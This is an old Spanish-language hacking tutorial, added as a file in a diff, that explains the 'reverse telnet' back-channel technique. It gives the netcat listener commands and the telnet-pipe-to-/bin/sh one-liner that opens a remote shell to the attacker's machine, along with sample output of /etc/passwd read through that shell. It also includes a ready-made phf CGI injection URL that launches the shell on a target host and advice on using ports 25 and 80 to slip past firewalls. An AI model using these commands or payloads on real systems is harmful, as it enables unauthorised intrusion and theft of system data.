@@ -1,0 +1,147 @@
+Reverse Telnet Mini-HOWTO
+inetd@kernelpanik.org
+kernelpanik research team.
+18/04/2000
+
+1. ¨Que es reverse telnet?
+2. Explicaci¢n del proceso y ejemplos.
+3. Cuando utilizar reverse telnet.
+4. Herramientas y software.
+
+1. ¨Que es reverse telnet?
+
+Bueno, pues como su nombre indica es una tecnica basada en telnet, es decir
+abrir una sesi¢n remota entre una maquina y otra, pero al contrario que en 
+otros ataques, en este caso, la maquina atacada (target host) va a ser la que
+nos haga telnet a nosotros, de hay lo de reverse, a esta tecnica tambien se
+le llama back channel, y es muy util cuando queremos hacer telnet a una 
+maquina y no esta habilitado el puerto del telnet.
+
+2. Explicacion del proceso y ejemplos.
+
+El proceso es bastante simple, se trata simplemente de invertir el proceso de
+telnet, es decir en vez de iniciar la sesi¢n en nuestro lado y terminarla en un
+servidor remoto, lo que vamos a hacer es abrir unos puertos en nuestra maquina
+que actuaran de servidor e iniciar un cliente en la maquina remota.
+
+Como habilitamos el pseudo-servidor en nuestra maquina?, bien, recurrimos al
+nunca bien valorado netcat, posiblemente una de las mejores herramientas que se
+han inventado nunca, bien vamos a levantar dos puertos, uno para enviar datos
+y otro para recibir datos, ejecutamos, cada uno en una terminal:
+
+	nc -nvv -l -p 80
+	nc -nvv -l -p 25
+
+Parametros:
+		-n 	Solo IPs numerica.
+		-vv 	Modo Mega-verbose.
+		-l 	Listen mode. Espera a conexiones entrantes.
+		-p 	N£mero del puerto que queremos habilitar.
+
+Bien, ya hemos levantado nuestro peculiar servidor de telnet en nuestra maquina (192.168.1.4), 
+ahora lo que tenemos que hacer es iniciar la conexi¢n dese la maquina remota, como hacemos 
+esto, tambien bastante simple, pero se te tiene que ocurrir, escribimos el siguiente comando:
+
+	telnet 192.168.1.4 80 | /bin/sh | telnet 192.168.1.4 25
+
+explicacion, abrimos una conexi¢n desde la maquina remota al puerto 80 de nuestra maquina,
+le hacemos llegar la entrada de esta conexion a una shell (/bin/sh) mediante un pipe y redirigimos
+la salida de la shell mediante otro pipe a una nueva conexi¢n a nuestra maquina, al puerto 25, por
+donde vamos a recibir las respuestas.
+
+Bien, ya tenemos todo el tinglado montado, ahora solo falta que funcione, deberiamos tener lo siguiente
+en cada terminal:
+
+Terminal 1 - Puerto 80 - Envio de comandos
+------------------------------------------
+[root@vaca netcat]# ./nc -nvv -l -p 80
+listening on [any] 80 ...
+
+Terminal 2 - Puerto 25 - Recepci¢n de respuestas
+-----------------------------------------------
+[root@vaca netcat]# ./nc -nvv -l -p 25
+listening on [any] 25 ...
+
+Si fuesemos capaces de ver lo que se ejecuta en la maquina remota veriamos esto...
+
+Target Host
+-----------
+[root@pollo netcat]# telnet 192.168.1.4 80 | /bin/sh | telnet 192.168.1.4 25
+Trying 192.168.1.4...
+Connected to 192.168.1.4.
+Escape character is '^]'.
+/bin/sh: Trying: command not found
+/bin/sh: Connected: command not found
+/bin/sh: Escape: command not found
+
+y digo si fuesemos capaces, porque lo normal sera que no le veamos, si no, para
+que ibamos a montar este tinglado.
+
+Paso siguiente, ejecutar comandos en la maquina remota, para hacer esto debemos
+enviar a traves de nuestra terminal con el netcat en el puerto 80, los comandos
+en un formato especifico, este formato es el siguiente:
+
+echo `comando_a_ejecutar parametros`
+
+veamos un ejemplo practico de esto, ejecutemos el tipico y deseado 
+cat /etc/passwd y a ver que pasa...
+
+Terminal 1 - Puerto 80 - Envio de comandos
+------------------------------------------
+[root@vaca netcat]# ./nc -nvv -l -p 80
+listening on [any] 80 ...
+connect from (UNKNOWN) [192.168.1.2] 2144
+echo `cat /etc/passwd`
+
+Terminal 2 - Puerto 25 - Recepci¢n de respuestas
+-----------------------------------------------
+[root@vaca netcat]# ./nc -nvv -l -p 25
+connect from (UNKNOWN) [192.168.1.2] 2145
+root:x:0:0:root:/root:/bin/bash bin:*:1:1:bin:/bin: daemon:*:2:2:dae
+mon:/sbin: adm:*:3:4:adm:/var/adm: lp:*:4:7:lp:/var/spool/lpd: sync:*:5:0:sync:/
+sbin:/bin/sync shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown halt:*:7:0:halt:/sbi
+n:/sbin/halt mail:*:8:12:mail:/var/spool/mail: news:*:9:13:news:/var/spool/news:
+ uucp:*:10:14:uucp:/var/spool/uucp: operator:*:11:0:operator:/root: games:*:12:1
+00:games:/usr/games: gopher:*:13:30:gopher:/usr/lib/gopher-data: ftp:*:14:50:FTP
+ User:/home/ftp: nobody:*:99:99:Nobody:/: xfs:!!:100:101:X Font Server:/etc/X11/
+fs:/bin/false gdm:!!:42:42::/home/gdm:/bin/bash
+
+pues ya esta, igual que hemos ejecutado ese cat, podemos ejecutar cualquier comando
+bajo el id con el que hayamos ejecutado el comando en la maquina remota.
+
+Si pensamos un poco, llegamos a la conclusi¢n, para que narices me sirve esto si
+para ejecutar el telnet en la maquina remota tengo que tener acceso a ella, si, pero
+hay accesos y accesos.
+
+3. Cuando utilizar reverse telnet.
+
+Bien, parece que en el punto anterior, no quedaba clara la utilidad de esta tecnica, bien
+en este punto vamos a ver como si la tiene, la primera y mas clara utilidad es si tenemos
+una maquina en la que por ejemplo, tenemos acceso a un cgi-bin/phf/php mal configurado
+y que nos permita ejecutar algun comando desde el navegador, bien, ejecutamos el comando citado anteriormente
+y plas, tenemos una shell sin usuario y sin password, el ejemplo usando el bug del phf, que
+aun existe, seria el siguiente:
+
+http://www.targethost.com/cgi-bin/phf?Qalias=x$0a/bin/telnet/%20192.168.1.4%2080%20|%20/bin/sh%20|%20/bin/telnet%20192.168.1.4%2025
+
+y ya tendriamos nuestra shell up&running, igualmente podemos utilizar exploits remotos 
+que solo nos permiten ejecutar codigo en el servidor para poner en practica esta 
+tecnica, en fin, echadle imaginaci¢n.
+
+Porque utilizar precisamente esos puertos, osea 25 y 80, simple, si la maquina esta
+firewalleada, es mas facil que tenga abiertos hacia afuera puertos de servicio comunes,
+que puertos mas altos o que se usen menos.
+
+4. Herramientas y software.
+
+La unico que necesitas para llevar a cabo esta tecnica es el netcat y
+un navegador.
+
+El netcat se puede descargar en versiones para UNIX y NT (beta) de:
+
+http://www3.l0pht.com/~weld/netcat/
+
+
+kernelpanik research team.
+[EOF]
+
